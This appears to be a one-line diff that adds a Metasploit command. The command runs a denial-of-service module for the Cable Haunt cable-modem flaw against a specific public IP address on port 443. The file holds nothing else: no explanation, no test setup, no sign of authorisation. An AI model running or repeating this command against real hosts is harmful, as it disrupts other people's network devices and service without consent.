@@ -1,0 +1,1 @@
+ msfconsole -q -x use auxiliary/dos/http/cable_haunt_websocket_dos;set RHOSTS 197.221.14.11;set RPORT 443; run; exit;
